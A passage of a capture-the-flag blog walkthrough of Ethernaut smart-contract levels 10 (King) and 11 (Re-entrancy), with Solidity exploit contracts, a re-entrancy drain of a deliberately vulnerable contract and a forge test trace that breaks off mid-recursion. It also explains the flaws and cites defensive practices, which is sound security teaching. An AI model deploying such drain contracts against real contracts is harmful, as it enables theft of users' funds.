</span></span><span style="display:flex;"><span>        (<span style="color:#00979d">bool</span> <span style="color:#434f54">success</span>, ) <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#434f54">_king</span>).<span style="color:#728e00">call</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>}(<span style="color:#7f8c8d">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#434f54">success</span>, <span style="color:#7f8c8d">&#34;failed to send ether&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Actually, we don&rsquo;t need to send any Ether because the initial
<code>prize</code> is <code>0</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">KingExploit</span> <span style="color:#434f54">expl</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">KingExploit</span>();
</span></span><span style="display:flex;"><span>    (<span style="color:#728e00">new</span> <span style="color:#434f54">KingExploit</span>()).<span style="color:#434f54">run</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">level</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This works too 😜</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Lessons learned</p>
<p>It is important to handle failed transactions properly. When
sending ETH always keep in mind that the transaction might fail
because of the following reasons:</p>
<ul>
<li>The receiving contract has <code>receive</code> or <code>fallback</code> function
that always throws an error/reverts.</li>
<li>Either of the <code>receive</code> or <code>fallback</code> functions consumes too
much gas (for no reason).</li>
<li>Absence of the <code>receive</code> and <code>fallback</code> functions means that a
contract cannot receive Ether through regular transactions and
throws an exception.</li>
</ul>
<p><a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/#favor-pull-over-push-for-external-calls"  class="external-link" target="_blank" rel="noopener">Favor
pull over push for external calls</a>.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/#dont-use-transfer-or-send"  class="external-link" target="_blank" rel="noopener">External
Calls</a> from Ethereum Smart Contract Best Practices</li>
<li><a href="https://swcregistry.io/docs/SWC-113"  class="external-link" target="_blank" rel="noopener">SWC-113</a> &ndash; DoS with Failed Call.</li>
<li><a href="https://solidity-by-example.org/sending-ether/"  class="external-link" target="_blank" rel="noopener">Sending
Ether (transfer, send, call)</a> from Solidity by Example.</li>
</ul>
<hr>
<p>The code and solution for this challenge is
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-10/src/test/King.t.sol"  class="external-link" target="_blank" rel="noopener">here</a>.
Let&rsquo;s move on to <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-11-re-entrancy" >#11 Re-entrancy</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #11 Re-entrancy</p>
<p>The objective of this challenge is to steal all the funds from
the contract.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Reentrance</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">mapping</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">=&gt;</span> <span style="color:#00979d">uint256</span>) <span style="color:#728e00">public</span> <span style="color:#434f54">balances</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">donate</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_to</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">balances</span>[<span style="color:#434f54">_to</span>] <span style="color:#728e00">+=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">balanceOf</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_who</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span> <span style="color:#728e00">balance</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#434f54">balances</span>[<span style="color:#434f54">_who</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">_amount</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">&gt;=</span> <span style="color:#434f54">_amount</span>) {
</span></span><span style="display:flex;"><span>            (<span style="color:#00979d">bool</span> <span style="color:#434f54">result</span>, ) <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>.<span style="color:#728e00">call</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#434f54">_amount</span>}(<span style="color:#7f8c8d">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">if</span> (<span style="color:#434f54">result</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#434f54">_amount</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#00979d">unchecked</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">-=</span> <span style="color:#434f54">_amount</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">receive</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Originally this level had the <code>pragma solidity ^0.6.0</code> and used the
<a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath"  class="external-link" target="_blank" rel="noopener">SafeMath</a>
from OpenZeppelin, which provides wrappers over Solidity’s
arithmetic operations. We use a is a slightly modified version
of it that:</p>
<ul>
<li>Doesn&rsquo;t use <code>SafeMath</code>.</li>
<li>Has the <code>unchecked</code> block in the <code>withdraw</code> function,
otherwise we&rsquo;ll get the <code>&quot;Arithmetic over/underflow&quot;</code> error
when we try to exploit it.</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>This contract allows to donate funds and withdraw the donation
at any time.</p>
<p><strong>State</strong></p>
<p>The <code>balances</code> state variable is used to track
user&rsquo;s donations:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">mapping</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">=&gt;</span> <span style="color:#00979d">uint256</span>) <span style="color:#728e00">public</span> <span style="color:#434f54">balances</span>;
</span></span></code></pre></div><p><strong>Functions</strong></p>
<ul>
<li><code>balanceOf</code> &ndash; Gets the amount donated by the given address.</li>
<li><code>donate</code> &ndash; Allows to donate ETH.</li>
<li><code>withdraw</code> &ndash; Lets you withdraw the previously donated ETH.</li>
<li><code>receive</code> &ndash; Allows sending funds to the contract, bypassing
the <code>donate</code> function. It may be needed to setup the
<code>Reentrance</code> contract by sending some ETH to it in advance (so
we have something to steal) or just in order to divert our
attention 🙃</li>
</ul>
<p>As the name of the level suggests, this contract should be prone
to the
<a href="https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy"  class="external-link" target="_blank" rel="noopener">Re-entrancy</a>
attack (when you know the name of the vulnerability it is
relatively simple to find it 😏). The <code>donate</code> function is
trivial, so let&rsquo;s concentrate on the <code>withdraw</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">_amount</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">&gt;=</span> <span style="color:#434f54">_amount</span>) {
</span></span><span style="display:flex;"><span>        (<span style="color:#00979d">bool</span> <span style="color:#434f54">result</span>, ) <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>.<span style="color:#728e00">call</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#434f54">_amount</span>}(<span style="color:#7f8c8d">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">result</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">_amount</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">unchecked</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">-=</span> <span style="color:#434f54">_amount</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function updates the internal state after sending funds. It
neither follows the
<a href="https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern"  class="external-link" target="_blank" rel="noopener">Checks-Effects-Interactions</a>
pattern, not does it use the
<a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard"  class="external-link" target="_blank" rel="noopener">ReentrancyGuard</a>
from the OpenZeppelin (module that helps prevent reentrant calls
to a function).</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Solution</p>
<p>A malicious contract could call the <code>withdraw</code> again and again,
draining all the funds. Here&rsquo;s how the interaction between the
<code>Exploit</code> and the <code>Reentrance</code> contracts might look like:</p>
 <div class="mermaid">
<p>%%{init: {&rsquo;theme&rsquo;:&rsquo;neutral&rsquo;, &lsquo;width&rsquo;: 320}}%%
sequenceDiagram
participant E as Exploit
participant R as Reentrance</p>
<p>E-&raquo;R: donate()
R&ndash;&raquo;E: success
E-&raquo;R: withdraw()
R&ndash;&raquo;E: receive()
E-&raquo;R: withdraw()
R&ndash;&raquo;E: receive()
E-&raquo;R: &hellip;
Note right of R: until address(Reentrance).balance &gt; 0
E-&raquo;R: withdraw()
R-&raquo;R: balances[msg.sender] -= amount</p>
 </div>
<p>Let&rsquo;s craft such a malicious contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">ReentranceExploit</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">Reentrance</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">level</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">private</span> <span style="color:#728e00">immutable</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#434f54">Reentrance</span> <span style="color:#434f54">_level</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">level</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_level</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#728e00">balance</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span>;
</span></span><span style="display:flex;"><span>        (<span style="color:#00979d">bool</span> <span style="color:#434f54">success</span>, ) <span style="color:#728e00">=</span> <span style="color:#434f54">owner</span>.<span style="color:#728e00">call</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#728e00">balance</span>}(<span style="color:#7f8c8d">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#434f54">success</span>, <span style="color:#7f8c8d">&#34;unable to withdraw&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">level</span>.<span style="color:#434f54">donate</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>}(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">level</span>.<span style="color:#434f54">withdraw</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">receive</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">levelBalance</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">level</span>).<span style="color:#728e00">balance</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">levelBalance</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#728e00">if</span> (<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">levelBalance</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#434f54">level</span>.<span style="color:#434f54">withdraw</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>);
</span></span><span style="display:flex;"><span>            } <span style="color:#728e00">else</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#434f54">level</span>.<span style="color:#434f54">withdraw</span>(<span style="color:#434f54">levelBalance</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It has 3 functions:</p>
<ul>
<li><code>run</code> &ndash; Runs the exploit.</li>
<li><code>receive</code> &ndash; Recursively calls the <code>level.withdraw</code>.</li>
<li><code>withdraw</code> &ndash; Allows the <code>player</code> to withdraw all the stolen funds.</li>
</ul>
<p>Let&rsquo;s review the <code>run</code> function:</p>
<ul>
<li>First, it donates some Ether so we can withdraw them back at the next step.</li>
<li>Then we call the <code>level.withdraw</code> function asking for the
amount we just deposited. This tiggers a chain of the <code>withdraw</code>-<code>receive</code> calls.</li>
</ul>
 <!--listend-->
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#434f54">donate</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>}(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#434f54">withdraw</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Our <code>receive</code> function calculates the amount funds left in the
<code>Reentrance</code> contract and re-enters it with the <code>level.withdraw</code>
call:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">receive</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">levelBalance</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">level</span>).<span style="color:#728e00">balance</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">levelBalance</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">levelBalance</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">level</span>.<span style="color:#434f54">withdraw</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#728e00">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">level</span>.<span style="color:#434f54">withdraw</span>(<span style="color:#434f54">levelBalance</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can withdraw at most what we&rsquo;ve donated. If there is less
Ether left, then we just withdraw the rest.</p>
<p>The <code>withdraw</code> function sends the stolen funds back to the
attacker (player):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#728e00">balance</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span>;
</span></span><span style="display:flex;"><span>    (<span style="color:#00979d">bool</span> <span style="color:#434f54">success</span>, ) <span style="color:#728e00">=</span> <span style="color:#434f54">owner</span>.<span style="color:#728e00">call</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#728e00">balance</span>}(<span style="color:#7f8c8d">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#434f54">success</span>, <span style="color:#7f8c8d">&#34;unable to withdraw&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Then, we set the initial donation to be 1/10 of the <code>Reentrance</code>
contract&rsquo;s balance and start the exploit:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">ReentranceExploit</span> <span style="color:#434f54">expl</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">ReentranceExploit</span>(<span style="color:#434f54">level</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">donation</span> <span style="color:#728e00">=</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">level</span>).<span style="color:#728e00">balance</span> <span style="color:#728e00">/</span> <span style="color:#8a7b52">10</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">expl</span>.<span style="color:#434f54">run</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#434f54">donation</span>}();
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">expl</span>.<span style="color:#434f54">withdraw</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here is how the forge&rsquo;s trace looks like:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract ReentranceTest -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testReentrancy<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 629051<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>629051<span style="color:#728e00">]</span> ReentranceTest::testReentrancy<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>233837<span style="color:#728e00">]</span> ReentranceTest::create<span style="color:#728e00">{</span>value: 1000000000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>214811<span style="color:#728e00">]</span> Ethernaut::createLevelInstance<span style="color:#728e00">{</span>value: 1000000000000000000<span style="color:#728e00">}(</span>ReentranceFactory: <span style="color:#728e00">[</span>0xce71065d4017f316ec606fe4422e11eb2c47c246<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>156548<span style="color:#728e00">]</span> ReentranceFactory::createInstance<span style="color:#728e00">{</span>value: 1000000000000000000<span style="color:#728e00">}(</span>player: <span style="color:#728e00">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>116965<span style="color:#728e00">]</span> → new Reentrance@<span style="color:#7f8c8d">&#34;0x037f…dd8f&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#8a7b52">584</span> bytes of code
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>55<span style="color:#728e00">]</span> Reentrance::fallback<span style="color:#728e00">{</span>value: 100000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Reentrance: <span style="color:#728e00">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span style="color:#728e00">]</span>, instance: Reentrance: <span style="color:#728e00">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← Reentrance: <span style="color:#728e00">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← Reentrance: <span style="color:#728e00">[</span>0x037fc82298142374d974839236d2e2df6b5bdd8f<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>0x2f66c75a001ba71ccb135934f48d844b46454543<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>170322<span style="color:#728e00">]</span> → new &lt;Unknown&gt;@<span style="color:#7f8c8d">&#34;0xa2f9…f3a7&#34;</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#8a7b52">849</span> bytes of code
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>119933<span style="color:#728e00">]</span> 0xa2f9…f3a7::run<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>22510<span style="color:#728e00">]</span> Reentrance::donate<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}(</span>0xa2f9062527f5588fcfd767b218ce33210574f3a7<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>89866<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>82241<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>81662<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   ├─ <span style="color:#728e00">[</span>75150<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   ├─ <span style="color:#728e00">[</span>74687<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>68587<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>68124<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>62024<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>61560<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>55460<span style="color:#728e00">]</span> 0xa2f9…f3a7::fallback<span style="color:#728e00">{</span>value: 10000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   │   │   │   │   │   │   │   ├─ <span style="color:#728e00">[</span>54997<span style="color:#728e00">]</span> Reentrance::withdraw<span style="color:#728e00">(</span>10000000000000<span style="color:#728e00">)</span>
